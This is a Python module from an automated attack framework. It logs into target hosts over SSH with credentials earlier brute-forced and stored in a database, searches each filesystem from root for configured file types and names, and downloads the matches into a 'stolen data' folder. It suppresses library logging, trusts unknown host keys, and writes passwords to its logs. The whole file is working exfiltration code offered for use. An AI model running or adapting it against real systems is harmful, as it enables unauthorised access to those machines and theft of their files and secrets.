"""steal_files_ssh.py - SSH file exfiltration using DB creds from SSHBruteforce (paramiko)."""

import os
import time
import logging
import paramiko
from threading import Timer
from typing import List, Tuple, Dict, Optional

from shared import SharedData
from logger import Logger

# Logger for this module
logger = Logger(name="steal_files_ssh.py", level=logging.DEBUG)

# Silence Paramiko's internal logs (no "Error reading SSH protocol banner" spam)
for _name in ("paramiko", "paramiko.transport", "paramiko.client", "paramiko.hostkeys"):
    logging.getLogger(_name).setLevel(logging.CRITICAL)

b_class        = "StealFilesSSH"        # Unique action identifier
b_module       = "steal_files_ssh"      # Python module name (this file without .py)
b_status       = "steal_files_ssh"      # Human/readable status key (free form)

b_action       = "normal"               # 'normal' (per-host) or 'global'
b_service      = ["ssh"]                # Services this action is about (JSON-ified by sync_actions)
b_port         = 22                     # Preferred target port (used if present on host)

# Trigger strategy:
# - Prefer to run as soon as SSH credentials exist for this MAC (on_cred_found:ssh).
# - Also allow starting when the host exposes SSH (on_service:ssh),
#   but the requirements below still enforce that SSH creds must be present.
b_trigger      = 'on_any:["on_cred_found:ssh","on_service:ssh"]'

# Requirements (JSON string):
# - must have SSH credentials on this MAC
# - must have port 22 (legacy fallback if port_services is missing)
# - limit concurrent running actions system-wide to 2 for safety
b_requires     = '{"all":[{"has_cred":"ssh"},{"has_port":22},{"max_concurrent":2}]}'

# Scheduling / limits
b_priority     = 70                     # 0..100 (higher processed first in this schema)
b_timeout      = 900                    # seconds before a pending queue item expires
b_max_retries  = 1                      # minimal retries; avoid noisy re-runs
b_cooldown     = 86400                  # seconds (per-host cooldown between runs)
b_rate_limit   = "3/86400"              # at most 3 executions/day per host (extra guard)

# Risk / hygiene
b_stealth_level = 6                     # 1..10 (higher = more stealthy)
b_risk_level    = "high"                # 'low' | 'medium' | 'high'
b_enabled       = 1                     # set to 0 to disable from DB sync

# Tags (free taxonomy, JSON-ified by sync_actions)
b_tags         = ["exfil", "ssh", "loot"]

class StealFilesSSH:
    """StealFilesSSH: connects via SSH using known creds and downloads matching files."""

    def __init__(self, shared_data: SharedData):
        """Init: store shared_data, flags, and build an IP->(MAC, hostname) cache."""
        self.shared_data = shared_data
        self.sftp_connected = False   # flipped to True on first SFTP open
        self.stop_execution = False   # global kill switch (timer / orchestrator exit)
        self._ip_to_identity: Dict[str, Tuple[Optional[str], Optional[str]]] = {}
        self._refresh_ip_identity_cache()
        logger.info("StealFilesSSH initialized")

    # --------------------- Identity cache (hosts) ---------------------

    def _refresh_ip_identity_cache(self) -> None:
        """Rebuild IP -> (MAC, current_hostname) from DB.hosts."""
        self._ip_to_identity.clear()
        try:
            rows = self.shared_data.db.get_all_hosts()
        except Exception as e:
            logger.error(f"DB get_all_hosts failed: {e}")
            rows = []

        for r in rows:
            mac = r.get("mac_address") or ""
            if not mac:
                continue
            hostnames_txt = r.get("hostnames") or ""
            current_hn = hostnames_txt.split(';', 1)[0] if hostnames_txt else ""
            ips_txt = r.get("ips") or ""
            if not ips_txt:
                continue
            for ip in [p.strip() for p in ips_txt.split(';') if p.strip()]:
                self._ip_to_identity[ip] = (mac, current_hn)

    def mac_for_ip(self, ip: str) -> Optional[str]:
        """Return MAC for IP using the local cache (refresh on miss)."""
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[0]

    def hostname_for_ip(self, ip: str) -> Optional[str]:
        """Return current hostname for IP using the local cache (refresh on miss)."""
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[1]

    # --------------------- Credentials (creds table) ---------------------

    def _get_creds_for_target(self, ip: str, port: int) -> List[Tuple[str, str]]:
        """
        Fetch SSH creds for this target from DB.creds.
        Strategy:
          - Prefer rows where service='ssh' AND ip=target_ip AND (port is NULL or matches).
          - Also include rows for same MAC (if known), still service='ssh'.
        Returns list of (username, password), deduplicated.
        """
        mac = self.mac_for_ip(ip)
        params = {"ip": ip, "port": port, "mac": mac or ""}

        # Pull by IP
        by_ip = self.shared_data.db.query(
            """
            SELECT "user", "password"
              FROM creds
             WHERE service='ssh'
               AND COALESCE(ip,'') = :ip
               AND (port IS NULL OR port = :port)
            """,
            params
        )

        # Pull by MAC (if we have one)
        by_mac = []
        if mac:
            by_mac = self.shared_data.db.query(
                """
                SELECT "user", "password"
                  FROM creds
                 WHERE service='ssh'
                   AND COALESCE(mac_address,'') = :mac
                   AND (port IS NULL OR port = :port)
                """,
                params
            )

        # Deduplicate while preserving order
        seen = set()
        out: List[Tuple[str, str]] = []
        for row in (by_ip + by_mac):
            u = str(row.get("user") or "").strip()
            p = str(row.get("password") or "").strip()
            if not u or (u, p) in seen:
                continue
            seen.add((u, p))
            out.append((u, p))
        return out

    # --------------------- SSH helpers ---------------------

    def connect_ssh(self, ip: str, username: str, password: str, port: int = b_port, timeout: int = 10):
        """
        Open an SSH connection (no agent, no keys). Returns an active SSHClient or raises.
        NOTE: Paramiko logs are silenced at module import level.
        """
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # Be explicit: no interactive agents/keys; bounded timeouts to avoid hangs
        ssh.connect(
            hostname=ip,
            username=username,
            password=password,
            port=port,
            timeout=timeout,
            auth_timeout=timeout,
            banner_timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
        )
        logger.info(f"Connected to {ip} via SSH as {username}")
        return ssh

    def find_files(self, ssh: paramiko.SSHClient, dir_path: str) -> List[str]:
        """
        List candidate files from remote dir, filtered by config:
          - shared_data.steal_file_extensions (endswith)
          - shared_data.steal_file_names     (substring match)
        Uses `find <dir> -type f 2>/dev/null` to keep it quiet.
        """
        # Quiet 'permission denied' messages via redirection
        cmd = f'find {dir_path} -type f 2>/dev/null'
        stdin, stdout, stderr = ssh.exec_command(cmd)
        files = (stdout.read().decode(errors="ignore") or "").splitlines()

        exts = set(self.shared_data.steal_file_extensions or [])
        names = set(self.shared_data.steal_file_names or [])
        if not exts and not names:
            # If no filters are defined, do nothing (too risky to pull everything).
            logger.warning("No steal_file_extensions / steal_file_names configured - skipping.")
            return []

        matches: List[str] = []
        for fpath in files:
            if self.shared_data.orchestrator_should_exit or self.stop_execution:
                logger.info("File search interrupted.")
                return []
            fname = os.path.basename(fpath)
            if (exts and any(fname.endswith(ext) for ext in exts)) or (names and any(sn in fname for sn in names)):
                matches.append(fpath)

        logger.info(f"Found {len(matches)} matching files in {dir_path}")
        return matches

    def steal_file(self, ssh: paramiko.SSHClient, remote_file: str, local_dir: str) -> None:
        """
        Download a single remote file into the given local dir, preserving subdirs.
        """
        sftp = ssh.open_sftp()
        self.sftp_connected = True  # first time we open SFTP, mark as connected

        # Preserve partial directory structure under local_dir
        remote_dir = os.path.dirname(remote_file)
        local_file_dir = os.path.join(local_dir, os.path.relpath(remote_dir, '/'))
        os.makedirs(local_file_dir, exist_ok=True)

        local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
        sftp.get(remote_file, local_file_path)
        sftp.close()

        logger.success(f"Downloaded: {remote_file}  ->  {local_file_path}")

    # --------------------- Orchestrator entrypoint ---------------------

    def execute(self, ip: str, port: str, row: Dict, status_key: str) -> str:
        """
        Orchestrator entrypoint (signature preserved):
          - ip: target IP
          - port: str (expected '22')
          - row: current target row (compat structure built by shared_data)
          - status_key: action name (b_class)
        Returns 'success' if at least one file stolen; else 'failed'.
        """
        try:
            self.shared_data.bjorn_orch_status = b_class

            # Gather credentials from DB
            try:
                port_i = int(port)
            except Exception:
                port_i = b_port

            creds = self._get_creds_for_target(ip, port_i)
            logger.info(f"Found {len(creds)} SSH credentials in DB for {ip}")
            if not creds:
                logger.error(f"No SSH credentials for {ip}. Skipping.")
                return 'failed'

            # Define a timer: if we never establish SFTP in 4 minutes, abort
            def _timeout():
                if not self.sftp_connected:
                    logger.error(f"No SFTP connection established within 4 minutes for {ip}. Marking as failed.")
                    self.stop_execution = True

            timer = Timer(240, _timeout)
            timer.start()

            # Identify where to save loot
            mac = (row or {}).get("MAC Address") or self.mac_for_ip(ip) or "UNKNOWN"
            base_dir = os.path.join(self.shared_data.data_stolen_dir, f"ssh/{mac}_{ip}")

            # Try each credential until success (or interrupted)
            success_any = False
            for username, password in creds:
                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                    logger.info("Execution interrupted.")
                    break

                try:
                    logger.info(f"Trying credential {username}:{password} for {ip}")
                    ssh = self.connect_ssh(ip, username, password, port=port_i)
                    # Search from root; filtered by config
                    files = self.find_files(ssh, '/')

                    if files:
                        for remote in files:
                            if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                logger.info("Execution interrupted during download.")
                                break
                            self.steal_file(ssh, remote, base_dir)

                        logger.success(f"Successfully stole {len(files)} files from {ip}:{port_i} as {username}")
                        success_any = True

                    try:
                        ssh.close()
                    except Exception:
                        pass

                    if success_any:
                        break  # one successful cred is enough

                except Exception as e:
                    # Stay quiet on Paramiko internals; just log the reason and try next cred
                    logger.error(f"SSH loot attempt failed on {ip} with {username}: {e}")

            timer.cancel()
            return 'success' if success_any else 'failed'

        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'


if __name__ == "__main__":
    # Minimal smoke test if run standalone (not used in production; orchestrator calls execute()).
    try:
        sd = SharedData()
        action = StealFilesSSH(sd)
        # Example (replace with a real IP that has creds in DB):
        # result = action.execute("192.168.1.10", "22", {"MAC Address": "AA:BB:CC:DD:EE:FF"}, b_status)
        # print("Result:", result)
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
